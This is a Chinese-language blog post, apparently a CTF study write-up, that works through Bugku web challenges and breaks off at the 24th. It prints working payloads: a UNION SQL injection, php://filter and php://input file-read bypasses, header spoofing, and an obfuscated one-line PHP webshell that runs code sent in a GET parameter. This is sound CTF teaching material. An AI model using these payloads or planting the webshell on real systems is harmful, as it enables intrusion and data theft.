<!DOCTYPE html>
<html>

<head><meta name="generator" content="Hexo 3.9.0">
  
  <title>review-bugku - Cupid&#39;s Blog</title>
  <meta charset="UTF-8">
  <meta name="description" content="a new ctfer&#39;s study">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  

  <link rel="shortcut icon" href="/images/4023.gif" type="image/png">
  <meta name="description" content="0x00前言 由于一些不可逆因素，我又得重新刷一遍bugku">
<meta property="og:type" content="article">
<meta property="og:title" content="review-bugku">
<meta property="og:url" content="http://yoursite.com/2020/01/19/review-bugku/index.html">
<meta property="og:site_name" content="Cupid&#39;s Blog">
<meta property="og:description" content="0x00前言 由于一些不可逆因素，我又得重新刷一遍bugku">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2020-02-09T08:22:32.213Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="review-bugku">
<meta name="twitter:description" content="0x00前言 由于一些不可逆因素，我又得重新刷一遍bugku">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
  
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
  <link rel="stylesheet" href="/css/style.css?v=1582646440403">
</head>

<body class="mdui-drawer-body-left">
  
  <div id="nexmoe-background">
    <div class="nexmoe-bg" style="background-image: url(http://p0.ssl.cdn.btime.com/t01cd55c4b5ab3036c2.jpg#是博客的背景，又是文章默认头图)"></div>
    <div class="mdui-appbar mdui-shadow-0">
      <div class="mdui-toolbar">
        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
        <div class="mdui-toolbar-spacer"></div>
        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
        <a href="/" title="Cupid" class="mdui-btn mdui-btn-icon"><img src="/images/namei.png"></a>
       </div>
    </div>
  </div>
  <div id="nexmoe-header">
      <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Cupid">
            <img src="/images/namei.png" alt="Cupid">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>Articles</span>66</div>
        <div><span>Tags</span>0</div>
        <div><span>Categories</span>6</div>
    </div>
    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </ul>
    <aside id="nexmoe-sidebar">
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Social</h3>
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://space.bilibili.com/23290461" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
            <i class="nexmoefont icon-bilibili"></i>
        </a><a class="mdui-ripple" href="https://github.com/bephplover" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Categories</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/CTF/">CTF</a>
          <span class="category-list-count">5</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Web漏洞/">Web漏洞</a>
          <span class="category-list-count">3</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/resolve-question/">resolve-question</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/代码审计/">代码审计</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/密码学/">密码学</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/编程类/">编程类</a>
          <span class="category-list-count">3</span>
        </li>

        
      </ul>

    </div>
  </div>


  
  
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Archive</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
    </div>
  </div>


  
</aside>
    <div class="nexmoe-copyright">
        &copy; 2020 Cupid
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
    </div>
</div><!-- .nexmoe-drawer -->
  </div>
  <div id="nexmoe-content">
    <div class="nexmoe-primary">
        <div class="nexmoe-post">
    <div class="nexmoe-post-cover"> 
        
            <img src="http://p0.ssl.cdn.btime.com/t01cd55c4b5ab3036c2.jpg#是博客的背景，又是文章默认头图">
        
        <h1>review-bugku</h1>
    </div>
  <div class="nexmoe-post-meta">
    <a><i class="nexmoefont icon-calendar-fill"></i>2020年01月19日</a>
    <a><i class="nexmoefont icon-areachart"></i>4.4k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 20 分钟</a>
    
      <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
    
    
  </div>
  <article>
    <h2>0x00前言</h2>
由于一些不可逆因素，我又得重新刷一遍bugku<a id="more"></a>，虽然大家都说上面题简单，但能自己亲手对每一个题做出来的人，并且学习到其中的知识点，对于现目前处于迷茫期的我可能极有帮助，废话不多说，直接开刷(尽量不看wp)
<h2>0x01开始刷题</h2>
WEB部分
1.[WEB2](http://123.206.87.240:8002/web2/ "WEB2")
进入页面后是眼花缭乱的滑稽图，直接ctrl+u查看源码，拿到flag.
2.[计算器](http://123.206.87.240:8002/yanzhengma/ "计算器")
进入页面后有个输入框，问38+20=？发现只能输入一个数字，f12打开控制台查看前端代码，在表单部分代码中发现有maxlength=1的字样，改为10后发现可以输入正确答案了，弹框得到flag.
3.[基础$_get](http://123.206.87.240:8002/get/)
进入页面有代码提示，get传入what=flag即可拿到flag.
4.[基础$_post](http://123.206.87.240:8002/post/)
进入页面同上post传入what=flag即可拿到flag.
5.[矛盾](http://123.206.87.240:8002/get/index1.php "矛盾")
进入页面后代码提示get传入的num不是数字且num又等于1，判断用的==是弱类型比较传入num=1a即可拿到flag.
6.[WEB3](http://123.206.87.240:8002/web3/)
进入页面JS弹框flag就在这里，查看源代码后发现:
<figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="string">#75</span>;&amp;<span class="string">#69</span>;&amp;<span class="string">#89</span>;&amp;<span class="string">#123</span>;&amp;<span class="string">#74</span>;&amp;<span class="string">#50</span>;&amp;<span class="string">#115</span>;&amp;<span class="string">#97</span>;&amp;<span class="string">#52</span>;&amp;<span class="string">#50</span>;&amp;<span class="string">#97</span>;&amp;<span class="string">#104</span>;&amp;<span class="string">#74</span>;&amp;<span class="string">#75</span>;&amp;<span class="string">#45</span>;&amp;<span class="string">#72</span>;&amp;<span class="string">#83</span>;&amp;<span class="string">#49</span>;&amp;<span class="string">#49</span>;&amp;<span class="string">#73</span>;&amp;<span class="string">#73</span>;&amp;<span class="string">#73</span>;&amp;<span class="string">#125</span>;</span><br></pre></td></tr></table></figure>

<p>这个是unicode编码，先知道这是一种Html页面编码形式就可以了解码即可拿下flag.<br>7.域名解析(听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag)<br>这个直接在本地的域名解析文件中添加上flag.baidu.com 与123.206.87.240再访问这个页面即可<br>hosts文件位置C:\Windows\System32\drivers\etc\hosts<br>之前我这样做是拿到了flag了，现在网站崩了，继续下一道题<br>8.<a href="http://123.206.87.240:8002/web12/" target="_blank" rel="noopener">你必须让他停下</a><br>这道题进入页面后发现页面在无限的刷新，我们直接用BP抓包，送到Repeater中后不断go就会出现flag.<br>9.<a href="http://123.206.87.240:8003/" target="_blank" rel="noopener">本地包含</a><br>这个题也是炸了，网上看wp原页面有如下源代码:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">	<span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">	$a = @$_REQUEST[<span class="string">'hello'</span>];</span></span><br><span class="line"><span class="php">	<span class="keyword">eval</span>(<span class="string">"var_dump($a)"</span>);</span></span><br><span class="line"><span class="php">	show_soruce(_FILE_);</span></span><br></pre></td></tr></table></figure>

<p>根据代码我们任然可以做，由于文件包含并且采用request方式传参那么我们可以直接用到php的filter协议读取flag.php,当然又由于是本地文件包含，更简单的直接用file函数即可构造hello=file(‘flag.php’)即可读取到其内容<br>10.<a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">变量1</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__file__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $args = $_GET[<span class="string">'args'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>同样包含了flag1.php,这里正则表达式\w+代表匹配数字下划线字母的多个字符。提示了flag在变量中我们看看全局变量$GLOBAL的内容，传入args=GLOBALS拿下flag.<br>11.<a href="http://123.206.87.240:8002/web5/" target="_blank" rel="noopener">WEB5</a><br>进入页面，提示JSPFUCK??然后ctrl+u查看源代码发现很多[][(![]+[])[+[]]+([![]]+[][[]])这就是js的一种编码方式，我们直接去可以输入js的console解码，直接拿到flag再按照格式提交即可。<br>这儿主要考察的是jjencode和aaencode(颜文字)<br>jjencode主要是把JS代码转换成只有符号的字符串，而aaencode是把JS代码转换成常用的网络表情，解密直接用浏览器的控制台输入密文，执行后可解密。<br>12.<a href="http://123.206.87.240:9009/hd.php" target="_blank" rel="noopener">头等舱</a><br>进入页面后提示什么也没有，我们抓包后发包看看响应，在响应包的头部发现了flag.这道题主要让我们要注意网页的请求和响应包，特别是里面包含的头部隐藏着许多重要的信息<br>13.<a href="http://123.206.87.240:8002/webshell/" target="_blank" rel="noopener">网站被黑</a><br>这个提示网站存在漏洞，那先用御剑扫描一哈，发现存在后台shell.php，然后进入一个Pass输入框，爆破即可拿到flag.<br>14.<a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">管理员系统</a><br>进入页面后，我们发现登录框，直接admin/admin尝试登录发现IP禁止访问，从这里可以看出检验方式应该是判断的http头部的XFF我们抓包后改成127.0.0.1再试试，结果提示域相关参数设置有误，我们的用户名和密码这里肯定还错了，回到原页面查看下源代码，看下是否有提示，F12发现base64的test123,这里猜测用户名应该就为admin,密码test123试试，拿到flag.<br>15.<a href="http://123.206.87.240:8002/web4/" target="_blank" rel="noopener">WEB4</a><br>直接让我们查看源代码，发现两串奇怪的变量，按js里面的函数操作，那么应该需要unescape解码即可拿到flag.<br>首先得到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);<span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)&#123;<span class="keyword">if</span>(<span class="string">"67d709b2b</span></span><br></pre></td></tr></table></figure>

<p>然后解码是</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">54</span>aa2aa648cf6e87a7114f1<span class="string">"==a.value)return!0;alert("</span>Erro<span class="string">r");a.focus();return!1&#125;&#125;document.getElementById("</span>levelQuest<span class="string">").onsubmit=checkSubmit;</span></span><br></pre></td></tr></table></figure>

<p>也就是在输入框提交67d709b2b54aa2aa648cf6e87a7114f1试试，拿到flag.<br>16.<a href="http://123.206.87.240:8005/post/index.php" target="_blank" rel="noopener">flag在index里</a><br>进入页面后，提示不要点击，点击后发现Url中出现可疑的file=show.php,这里试试能否使用php的filter协议,发现可以直接读取index.php的base64代码内容，解码后出现flag</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bugku-ctf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span></span><br><span class="line"><span class="php">	$file=$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span></span><br><span class="line"><span class="php">		<span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">include</span>($file); </span></span><br><span class="line"><span class="php"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>很典型的文件包含漏洞，文件包含漏洞的利用很广，这里采用了php的filter协议读取php文件代码内容。<br>17.<a href="http://123.206.87.240:8002/baopo/" target="_blank" rel="noopener">输入密码查看flag</a><br>直接抓包爆破，就拿到flag<br>18.<a href="http://123.206.87.240:9001/test/" target="_blank" rel="noopener">点击一百万次</a><br>这里网站已经崩了，但我还记得，点饼干的次数是由一个可以post的变量决定的，post他的值改为1000000即可拿到flag.<br>19.<a href="http://123.206.87.240:8002/web16/" target="_blank" rel="noopener">备份是个好习惯</a><br>页面出现奇怪的代码，应该是某个Hash加密，因为题目提示了备份，因而直接访问该目录下的index.php.bak发现可以下载文件，打开</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span></span><br><span class="line"><span class="php">$str = substr($str,<span class="number">1</span>);</span></span><br><span class="line"><span class="php">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span></span><br><span class="line"><span class="php">parse_str($str);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> md5($key1);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> md5($key2);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>从上面代码可以分析出来只要满足提交key1与key2值不相等，但其md5后相同。那么利用md5函数的漏洞直接使用数组绕过，这里从代码中还看到对关键字key进行了过滤，将key过滤为了空，然后由于parse_str直接把str中的内容引入变量中，因而存在变量覆盖问题，这里可以直接在url中传入kkeyer1[]=abc&amp;kkeyey2[]=cde即可拿到flag.当然也可传入两个md5同为0e的即可绕过==这里就利用了弱类型比较，即可绕过。这下我们也知道了最开始页面上的代码是加密后的结果<br>20.<a href="http://123.206.87.240:8002/chengjidan/" target="_blank" rel="noopener">成绩单</a><br>输入1出现成绩值，然后1’成绩消失，说明存在sql注入，极有可能sql语句就为select 成绩 from 成绩单 where id=$_POST[‘id’]<br>然后使用order by判断字段个数，使用1’ order by 4#依然出现值，然后使用5不出现值，说明字段个数为4，接下来使用联合查询将输入语句改为0’ union select 1,2,3,database()#查出数据库为skctf_flag，接着使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>即可查出表名f14g接着爆字段名同上再爆字段内容即可拿到flag.<br>21.<a href="http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=" target="_blank" rel="noopener">cookies欺骗</a><br>观察url发现filename=一个base64值，解码后是keys.txt,直接访问keys.txt发现就是一长串英文字母,按照这个url规则，试试访问index.php的内容，将index.php也base64后，发现出现一行代码，这里url还有line这个变量，我们修改其值发现出现代码，这样一个一个修改太麻烦，直接写一个python爬，如下所示，rang里面的可以改，改到所有代码出来为止，这里用到了一个强制类型转换，让line的数字融入url这个字符串中。这里还有一个python的细节就是range(0,25)不包含25</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line">    url= <span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span>+<span class="built_in">str</span>(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span></span><br><span class="line">    re=requests.<span class="built_in">get</span>(url)</span><br><span class="line">    <span class="built_in">print</span>(re.<span class="built_in">text</span>)</span><br></pre></td></tr></table></figure>

<p>写一个python脚本得到index.php的源码如下所示:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$file_list = <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$fa = file($file);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $fa[$line];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>首先我们肯定是要看keys.php，按照之前Url的规则将keys.php进行base64加密写在filename后面，然后按照获得的源代码，用BP抓包后，在数据包中添加cookie: margin=margin发包即可得到flag.</p>
<p>22.<a href="http://123.206.87.240:8006/test/hello.php?id=1" target="_blank" rel="noopener">never give up</a><br>看到这个id=1我就想着有可能是sql注入，但是这一没表单二没登陆的，，应该不是才对，看看有没有源码提示,发现1p.html访问试试，发现页面被跳转了，我们这里采用view-source查看这个1p.html的源码，这样可以看到跳转前的代码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	echo <span class="string">'no no no no no no no'</span>;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">"bugku is a nice plateform!"</span> and <span class="variable">$id</span>==<span class="number">0</span> and strlen(<span class="variable">$b</span>)&gt;<span class="number">5</span> and eregi(<span class="string">"111"</span>.substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) and substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	require(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	print <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>将代码先base64解码再url解码得到上面代码，这里我们发现了一个疑似flag的txt直接访问试试，拿到flag.还是分析一下源码，这里get传入的a与b需要满足条件才会包含这个txt.这里主要考点应该是考绕过eregi和stripos函数，绕过eregi可以使用数组也可以用00截断，而stripos则可以用伪协议绕过。<br>在url中构造id=.&amp;b=%0012345&amp;a=php://input,以及post提交bugku is a nice plateform!</p>
<p>23.过狗一句话</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> $poc=<span class="string">"a#s#s#e#r#t"</span>; $poc_1=explode(<span class="string">"#"</span>,$poc); $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>]) <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>flag进去网页后说是被删除不用做题了，上网搜索了哈应该是已经崩了，学习一下这个过狗一句话吧。<br>这道题我觉得原本应该是让用get传入s为任意代码或者命令，然后用assert去执行，查询到flag,最后环境被破坏了也是很难受。</p>
<p>24.<a href="http://123.206.87.240:8002/web10/" target="_blank" rel="noopener">字符正则</a><br>进入页面后是一段代码，需要审计</p>
